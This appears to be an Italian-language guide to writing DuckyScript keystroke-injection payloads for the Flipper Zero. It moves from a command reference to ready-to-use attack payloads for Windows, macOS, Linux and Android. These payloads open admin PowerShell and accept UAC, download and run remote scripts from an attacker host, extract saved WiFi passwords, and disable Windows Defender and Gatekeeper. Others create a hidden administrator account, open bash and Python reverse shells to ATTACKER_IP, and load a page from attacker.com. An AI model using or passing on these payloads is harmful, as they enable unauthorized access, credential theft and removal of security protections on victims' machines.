## DuckyScript - Il Linguaggio dei Payload

### Comandi Base

Il Flipper Zero supporta DuckyScript 1.0 (compatibilità Rubber Ducky) con estensioni:

```
REM         - Commento (ignorato)
DELAY       - Pausa in millisecondi (DELAY 500 = mezzo secondo)
STRING      - Digita una stringa di testo
ENTER       - Premi Enter
TAB         - Premi Tab
ESCAPE      - Premi Escape
BACKSPACE   - Premi Backspace
DELETE      - Premi Delete
SPACE       - Premi Spazio
UP/DOWN/LEFT/RIGHT - Frecce direzionali
CAPSLOCK    - Caps Lock
PRINTSCREEN - Print Screen
SCROLLLOCK  - Scroll Lock
PAUSE       - Pause/Break
INSERT      - Insert
HOME        - Home
END         - End
PAGEUP      - Page Up
PAGEDOWN    - Page Down
F1-F12      - Tasti funzione
```

### Modificatori (combinazioni tasti)

```
GUI         - Tasto Windows/Command (GUI r = Win+R)
ALT         - Tasto Alt (ALT F4 = Alt+F4)
CTRL        - Tasto Control (CTRL c = Ctrl+C)
SHIFT       - Tasto Shift (SHIFT TAB = Shift+Tab)
CTRL-ALT    - Ctrl+Alt combinati
CTRL-SHIFT  - Ctrl+Shift combinati
ALT-SHIFT   - Alt+Shift combinati
GUI-SHIFT   - Win+Shift combinati
```

### Comandi Avanzati (Flipper estensioni)

```
ALTCHAR     - Inserisce carattere tramite Alt code (es. ALTCHAR 064 = @)
ALTSTRING   - Digita stringa usando Alt codes (indipendente dal layout!)
ALTCODE     - Alias di ALTCHAR
SYSRQ       - System Request / SysRq
MEDIA       - Comandi multimediali
REPEAT      - Ripete l'ultimo comando N volte
WAIT_FOR_BUTTON_PRESS - Attende che l'utente prema il pulsante del Flipper
DEFAULT_DELAY - Imposta delay default tra ogni comando
```

### Struttura di un Payload Tipico

```
REM ======================================
REM Payload: Reverse Shell Windows
REM Target: Windows 10/11 con PowerShell
REM Layout: IT
REM Autore: [redacted]
REM ======================================

REM Imposta delay per macchine lente
DEFAULT_DELAY 100

REM Apri PowerShell come Admin (Windows 10/11)
GUI r
DELAY 500
STRING powershell
DELAY 200
CTRL-SHIFT ENTER
DELAY 1500

REM Accetta UAC (se presente)
ALT y
DELAY 500

REM Esegui payload
STRING IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')
ENTER
```

> **Nota personale:** Il DEFAULT_DELAY è fondamentale. Senza delay adeguati, il payload fallisce perchè le finestre non si aprono in tempo. Su Windows 10 moderno con SSD, 500ms dopo GUI r sono sufficienti. Su macchine vecchie con HDD, servono 1000-2000ms. Preferisco essere conservativo con i delay - un payload lento ma funzionante è meglio di uno veloce che fallisce.

---

## Sviluppo Payload per OS

### Windows

**Aprire PowerShell (metodo 1 - Run dialog):**
```
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000
```

**Aprire PowerShell come Admin (metodo 2 - Search):**
```
GUI
DELAY 500
STRING powershell
DELAY 500
CTRL-SHIFT ENTER
DELAY 1500
ALT y
DELAY 500
```

**Aprire CMD nascosto:**
```
GUI r
DELAY 500
STRING cmd /c start /min cmd
ENTER
```

**Scaricare ed eseguire file:**
```
STRING powershell -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://IP/payload.ps1')"
ENTER
```

**Estrarre password WiFi salvate:**
```
STRING powershell -c "netsh wlan show profiles | Select-String 'Profilo' | ForEach { $_.ToString().Split(':')[1].Trim() } | ForEach { netsh wlan show profile name=$_ key=clear }" > %TEMP%\wifi.txt
ENTER
```

**Disabilitare Windows Defender (richiede admin):**
```
STRING powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
ENTER
```

**Creare utente admin nascosto:**
```
STRING net user hacker P@ssw0rd123 /add && net localgroup administrators hacker /add
ENTER
```

### macOS

**Aprire Terminale:**
```
GUI SPACE
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 1000
```

**Scaricare ed eseguire:**
```
STRING curl -s http://IP/payload.sh | bash
ENTER
```

**Estrarre password WiFi (richiede password utente):**
```
STRING security find-generic-password -wa "SSID_NAME" 2>/dev/null
ENTER
```

**Disabilitare Gatekeeper temporaneamente:**
```
STRING sudo spctl --master-disable
ENTER
```

### Linux (GNOME/KDE)

**Aprire terminale GNOME:**
```
CTRL-ALT t
DELAY 500
```

**Aprire terminale KDE:**
```
GUI
DELAY 500
STRING konsole
ENTER
DELAY 500
```

**Reverse shell con netcat:**
```
STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
ENTER
```

**Reverse shell con Python:**
```
STRING python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
ENTER
```

### ChromeOS

**Aprire Crosh:**
```
CTRL-ALT t
DELAY 500
```

**Developer mode (se abilitato):**
```
STRING shell
ENTER
DELAY 500
```

### Android (con OTG)

**Aprire impostazioni rapide:**
```
GUI
DELAY 500
```

**Aprire browser:**
```
GUI
DELAY 300
STRING chrome
DELAY 300
ENTER
DELAY 1000
STRING http://attacker.com/payload
ENTER
```

---

